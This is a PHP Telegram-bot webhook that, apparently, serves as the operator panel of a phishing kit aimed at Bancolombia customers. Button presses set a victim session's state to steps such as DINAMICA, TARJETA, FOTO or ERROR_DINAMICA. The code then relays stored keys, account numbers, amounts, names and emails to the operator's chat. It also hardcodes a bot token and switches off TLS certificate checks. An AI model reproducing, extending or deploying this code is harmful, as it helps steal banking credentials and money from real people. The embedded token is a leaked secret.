<?php
header("HTTP/1.1 200 OK");
header("Content-Type: application/json; charset=utf-8");

$raw = file_get_contents("php://input");
if ($raw === false || $raw === '') {
    echo json_encode(['ok'=>true]);
    exit;
}

$update = json_decode($raw, true);
if (!is_array($update)) {
    echo json_encode(['ok'=>true]);
    exit;
}

require_once __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

$token = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";

function wh_log($line) {
    try {
        $logPath = __DIR__ . DIRECTORY_SEPARATOR . 'debug_webhook.log';
        $fp = @fopen($logPath, 'a');
        if ($fp) {
            @fwrite($fp, gmdate('Y-m-d\TH:i:s\Z') . " " . $line . "\n");
            @fclose($fp);
        }
    } catch (Throwable $_) { /* ignore */ }
}

function answerCallback($cbId, $text = 'OK', $showAlert = false) {
    global $token;
    $payload = json_encode([
        'callback_query_id' => $cbId,
        'text' => $text,
        'show_alert' => $showAlert,
    ]);
    $ch = curl_init("https://api.telegram.org/bot{$token}/answerCallbackQuery");
    if (!$ch) return false;
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $out = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['ok' => $code >= 200 && $code < 300, 'code' => $code, 'body' => $out];
}

function tgSend($chatId, $text, $reply_markup = null) {
    global $token;
    $body = ['chat_id' => $chatId, 'text' => $text];
    if ($reply_markup) $body['reply_markup'] = $reply_markup;
    $payload = json_encode($body);
    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    if (!$ch) return false;
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $out = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['ok' => $code >= 200 && $code < 300, 'code' => $code, 'body' => $out];
}

$remote = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
wh_log("START remote=$remote ua=" . substr($ua,0,120) . " rawlen=" . strlen($raw));

if (isset($update['callback_query']) && is_array($update['callback_query'])) {
    $cb = $update['callback_query'];
    $cbId = $cb['id'] ?? '';
    $data = $cb['data'] ?? '';
    $from = $cb['from']['id'] ?? 0;
    $chat = $cb['message']['chat']['id'] ?? 0;
    $msgId = $cb['message']['message_id'] ?? 0;

    wh_log("CB data=" . var_export($data,true) . " from=$from chat=$chat cbId=$cbId");

    $answered = false;
    $estado = null;
    $request_id = null;
    $opcion = null;

    if (preg_match('/^OPCION_(\d+)_(.+)$/', (string)$data, $m)) {
        $opcion     = (int)$m[1];
        $request_id = $m[2];
        $estado     = "opcion_" . $opcion;
    } elseif (preg_match('/^([a-zA-Z0-9_]+)_(.+)$/', (string)$data, $m)) {
        $estado     = $m[1];
        $request_id = $m[2];
    }

    if ($estado && $request_id) {
        // CIERRE TOTAL contra webhook global compartido con otros proyectos.
        // Este webhook SOLO actualiza request_id que empiecen por 'BCO_' (formato BANCOLOMBIA).
        // Cualquier otro formato (req_, NEQ_, vacio, etc) = SKIP TOTAL.
        $esBcoRid = (is_string($request_id) && strncmp($request_id, 'BCO_', 4) === 0);
        if (!$esBcoRid) {
            wh_log("SKIP request_id NO empieza por BCO_ (ignorado, otro proyecto?) data=" . var_export($data,true));
            if ($cbId) answerCallback($cbId, "OK (callback no Bancolombia, rid=" . substr($request_id,0,24) . ")", false);
            $answered = true;
        } else {
            $rowsAffected = 0;
            $foundBanco = '';
            $foundRid = '';
            try {
                global $pdo;
                $upd = $pdo->prepare(
                    "UPDATE solicitudes
                     SET estado = ?
                     WHERE BINARY request_id = ?
                       AND banco = 'Bancolombia'
                       AND LEFT(request_id,4) = 'BCO_'"
                );
                $upd->execute([$estado, $request_id]);
                $rowsAffected = (int)$upd->rowCount();

                $row = null;
                $sel = $pdo->prepare("SELECT request_id, `key`, numero_cuenta, monto, banco, estado, nombre, telefono, correo FROM solicitudes WHERE BINARY request_id = ? LIMIT 1");
                $sel->execute([$request_id]);
                $row = $sel->fetch(PDO::FETCH_ASSOC);
                if ($row) {
                    $foundBanco = (string)($row['banco'] ?? '');
                    $foundRid   = (string)($row['request_id'] ?? '');
                }
                wh_log("UPDATE estado=$estado request_id=" . var_export($request_id,true) . " rowsAffected=$rowsAffected foundBanco=$foundBanco foundRid=$foundRid");

                $labelMap = [
                    'opcion_1' => 'DINAMICA',
                    'opcion_2' => 'TARJETA',
                    'opcion_3' => 'ERROR_OP3',
                    'opcion_4' => 'ERROR_OP4',
                    'opcion_5' => 'FOTO',
                    'opcion_6' => 'OPCION_6',
                    'opcion_7' => 'OPCION_7',
                    'opcion_8' => 'OPCION_8',
                    'opcion_9' => 'ERROR_DINAMICA',
                    'opcion_10' => 'FINALIZAR',
                ];
                $lbl = $labelMap[$estado] ?? strtoupper(str_replace('_', ' ', $estado));

                $lines = [];
                $lines[] = "✅ Estado actualizado: {$lbl}";
                if ($row) {
                    $lines[] = "Request: " . ($row['request_id'] ?? '');
                    $lines[] = "Banco: "   . ($row['banco'] ?? '');
                    $lines[] = "Celular: " . ($row['numero_cuenta'] ?? '');
                    $lines[] = "Monto: "   . ($row['monto'] ?? '');
                    if (!empty($row['nombre']))   $lines[] = "Nombre: "   . $row['nombre'];
                    if (!empty($row['correo']))   $lines[] = "Correo: "   . $row['correo'];
                }

                if ($chat) {
                    tgSend($chat, implode("\n", $lines));
                }
                answerCallback($cbId, "{$lbl} aplicado ({$request_id})", false);
                $answered = true;
            } catch (Throwable $e) {
                $msg = $e->getMessage();
                wh_log("ERROR $msg");
                if ($cbId) answerCallback($cbId, "Error: " . substr($msg, 0, 120), true);
                error_log("TG webhook error: " . $msg);
                $answered = true;
            }
        }
    }

    if (!$answered && $cbId) {
        answerCallback($cbId, "OK");
    }
}

echo json_encode(['ok' => true]);
wh_log("END output_sent");
exit;
